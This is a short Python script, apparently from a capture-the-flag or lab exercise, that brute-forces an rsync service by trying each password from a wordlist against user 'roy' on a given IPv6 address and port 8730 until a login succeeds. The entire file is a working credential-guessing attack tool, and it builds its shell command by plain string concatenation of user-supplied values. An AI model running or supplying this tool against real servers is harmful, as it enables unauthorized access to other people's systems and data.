
import os
import sys

password = sys.argv[1]
ip = sys.argv[2]

passwd = open(password, 'r')
print("Starting The brute force! :D")
for x in passwd:
    x = x.replace('\n','')
    s = ("RSYNC_PASSWORD="+x+" rsync -6 rsync://roy@["+ip+"]:8730/home_roy/ > /dev/null 2>&1")
    check = os.system(s)
    if check == 0:
        print("The password is:"+x)
        exit()

